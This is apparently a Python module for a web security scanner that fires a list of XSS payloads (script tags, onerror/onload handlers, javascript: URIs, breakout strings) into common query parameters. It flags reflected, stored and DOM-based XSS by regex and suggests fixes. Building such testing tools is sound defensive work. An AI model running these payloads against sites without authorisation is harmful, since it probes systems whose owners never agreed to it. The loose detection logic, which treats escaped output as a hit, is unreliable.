"""XSS Scanner Module"""

import re
import html
import time
from tqdm import tqdm
from colorama import Fore, Style
from utils.http_client import HTTPClient

class XSSScanner:
    def __init__(self, http_client=None):
        self.http_client = http_client or HTTPClient()
        self.payloads = self.load_xss_payloads()
        
        # XSS patterns for detection
        self.xss_patterns = [
            r"<script[^>]*>.*?</script>",
            r"<img[^>]*onerror=.*?>",
            r"<svg[^>]*onload=.*?>",
            r"<body[^>]*onload=.*?>",
            r"<iframe[^>]*src=.*?>",
            r"javascript:[^\"']*",
            r"onclick=.*?[\"']",
            r"onmouseover=.*?[\"']",
            r"onload=.*?[\"']",
            r"onerror=.*?[\"']",
            r"onfocus=.*?[\"']",
            r"onblur=.*?[\"']",
        ]

    def load_xss_payloads(self):
        """Load comprehensive XSS payloads"""
        payloads = [
            # Basic script tags
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(window.location)</script>",
            
            # Image with onerror
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(document.cookie)>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            
            # SVG vectors
            "<svg onload=alert('XSS')>",
            "<svg onload=alert(document.domain)>",
            
            # Event handlers
            "<body onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>click</div>",
            "<input onfocus=alert('XSS') autofocus>",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            "javascript:alert(document.domain)",
            
            # Breakout vectors
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "></script><script>alert('XSS')</script>",
            
            # Without script tags
            "<img src=\"x:x\" onerror=\"alert('XSS')\">",
            "<iframe src=\"javascript:alert('XSS')\">",
            
            # Case variations
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<IMG SRC=x ONERROR=alert('XSS')>",
        ]
        return payloads

    def scan(self, target_url, html_content=None):
        """Comprehensive XSS scan with progress tracking"""
        print(f"\n{Fore.BLUE}[XSS Scan]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target: {target_url}{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # Test reflected XSS
        reflected_vulns = self.test_reflected_xss(target_url)
        vulnerabilities.extend(reflected_vulns)
        
        # Check for stored XSS patterns
        if html_content:
            stored_vulns = self.check_stored_xss(target_url, html_content)
            vulnerabilities.extend(stored_vulns)
        
        # Check DOM-based XSS indicators
        dom_vulns = self.check_dom_xss_indicators(html_content)
        vulnerabilities.extend(dom_vulns)
        
        return vulnerabilities

    def test_reflected_xss(self, target_url):
        """Test for reflected XSS vulnerabilities"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Testing reflected XSS...{Style.RESET_ALL}")
        
        test_params = ['q', 'search', 'query', 'id', 'name', 'message', 'comment']
        
        for param in test_params:
            param_vulns = self.test_parameter_xss(target_url, param)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                print(f"{Fore.RED}❌ XSS found in parameter: {param}{Style.RESET_ALL}")
                break
        
        return vulnerabilities

    def test_parameter_xss(self, target_url, param_name):
        """Test a specific parameter for XSS"""
        vulnerabilities = []
        
        for payload in tqdm(self.payloads, 
                           desc=f"  Testing {param_name}", 
                           bar_format='{l_bar}{bar:50}{r_bar}{bar:-50b}',
                           leave=False):
            
            try:
                # Build test URL with payload
                if '?' in target_url:
                    test_url = f"{target_url}&{param_name}={payload}"
                else:
                    test_url = f"{target_url}?{param_name}={payload}"
                
                # URL encode the payload for the request
                import urllib.parse
                encoded_payload = urllib.parse.quote(payload)
                test_url_encoded = f"{target_url}?{param_name}={encoded_payload}"
                
                response = self.http_client.get(test_url_encoded, timeout=8)
                
                if response and self.detect_xss_vulnerability(payload, response.text):
                    vulnerability = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'high',
                        'url': test_url,
                        'payload': payload,
                        'parameter': param_name,
                        'description': 'Reflected XSS vulnerability detected',
                        'recommendation': 'Implement proper input validation and output encoding. Use Content Security Policy.'
                    }
                    vulnerabilities.append(vulnerability)
                    
                    # Found vulnerability, no need to test more payloads for this parameter
                    break
                    
            except Exception as e:
                continue
                
            # Small delay to be respectful to the server
            time.sleep(0.1)
        
        return vulnerabilities

    def detect_xss_vulnerability(self, payload, response_text):
        """Enhanced XSS detection using multiple techniques"""
        if not response_text:
            return False
        
        # Technique 1: Check if payload is reflected without encoding
        if self.is_payload_reflected(payload, response_text):
            return True
        
        # Technique 2: Check for partial reflection in attributes
        if self.check_attribute_injection(payload, response_text):
            return True
        
        # Technique 3: Check for JavaScript execution contexts
        if self.check_js_context(payload, response_text):
            return True
        
        return False

    def is_payload_reflected(self, payload, response_text):
        """Check if payload is reflected in response without proper encoding"""
        # Decode HTML entities for comparison
        decoded_response = html.unescape(response_text)
        
        # Check if exact payload appears in response
        if payload in decoded_response:
            return True
        
        # Check for unencoded versions (basic filtering bypass)
        if payload.replace('<', '&lt;') in response_text:
            # If they're encoding but we can still see the pattern
            return True
        
        # Check for case-insensitive match
        if payload.lower() in response_text.lower():
            return True
            
        return False

    def check_attribute_injection(self, payload, response_text):
        """Check for attribute injection possibilities"""
        # Look for unquoted attributes that might allow injection
        attribute_patterns = [
            r'value=[^>]*' + re.escape(payload),
            r'src=[^>]*' + re.escape(payload),
            r'href=[^>]*' + re.escape(payload),
        ]
        
        for pattern in attribute_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def check_js_context(self, payload, response_text):
        """Check for JavaScript execution contexts"""
        js_contexts = [
            r'<script>[^<]*' + re.escape(payload),
            r'onload=[^>]*' + re.escape(payload),
            r'onerror=[^>]*' + re.escape(payload),
            r'javascript:[^>]*' + re.escape(payload),
        ]
        
        for context in js_contexts:
            if re.search(context, response_text, re.IGNORECASE):
                return True
        return False

    def check_stored_xss(self, target_url, html_content):
        """Check for stored XSS patterns in content"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Checking for stored XSS patterns...{Style.RESET_ALL}")
        
        if self.check_existing_xss(html_content):
            vulnerability = {
                'type': 'Cross-Site Scripting (XSS)',
                'severity': 'medium',
                'url': target_url,
                'payload': 'Existing in page content',
                'description': 'Potential XSS vectors found in page content',
                'recommendation': 'Review and sanitize all user-generated content. Implement CSP.'
            }
            vulnerabilities.append(vulnerability)
        
        return vulnerabilities

    def check_dom_xss_indicators(self, html_content):
        """Check for DOM-based XSS indicators"""
        vulnerabilities = []
        
        if not html_content:
            return vulnerabilities
            
        dom_indicators = [
            r'document\.write\s*\(',
            r'eval\s*\(',
            r'setTimeout\s*\([^)]*\)',
            r'setInterval\s*\([^)]*\)',
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'location\.(hash|href|search)',
        ]
        
        found_indicators = []
        for indicator in dom_indicators:
            if re.search(indicator, html_content, re.IGNORECASE):
                found_indicators.append(indicator)
        
        if found_indicators:
            vulnerability = {
                'type': 'DOM-based XSS Potential',
                'severity': 'low',
                'url': 'Client-side',
                'payload': 'DOM manipulation detected',
                'description': f'DOM manipulation functions found: {", ".join(found_indicators)}',
                'recommendation': 'Avoid unsafe DOM manipulation. Use safe alternatives like textContent instead of innerHTML.'
            }
            vulnerabilities.append(vulnerability)
        
        return vulnerabilities

    def check_existing_xss(self, html_content):
        """Check HTML content for existing XSS patterns"""
        for pattern in self.xss_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                return True
        return False

    def is_xss_payload(self, payload):
        """Check if payload contains XSS patterns"""
        for pattern in self.xss_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return True
        return False

    def generate_report(self, vulnerabilities):
        """Generate a detailed report of XSS findings"""
        if not vulnerabilities:
            return f"{Fore.GREEN}No XSS vulnerabilities found{Style.RESET_ALL}"
        
        report = [f"{Fore.RED}XSS Vulnerabilities Found:{Style.RESET_ALL}"]
        
        for i, vuln in enumerate(vulnerabilities, 1):
            report.append(f"\n{Fore.YELLOW}{i}. {vuln['type']}{Style.RESET_ALL}")
            report.append(f"   {Fore.CYAN}URL: {vuln['url']}{Style.RESET_ALL}")
            if 'parameter' in vuln:
                report.append(f"   {Fore.MAGENTA}Parameter: {vuln['parameter']}{Style.RESET_ALL}")
            report.append(f"   {Fore.MAGENTA}Payload: {vuln['payload']}{Style.RESET_ALL}")
            report.append(f"   {Fore.WHITE}Description: {vuln['description']}{Style.RESET_ALL}")
            report.append(f"   {Fore.GREEN}Recommendation: {vuln['recommendation']}{Style.RESET_ALL}")
        
        return "\n".join(report)
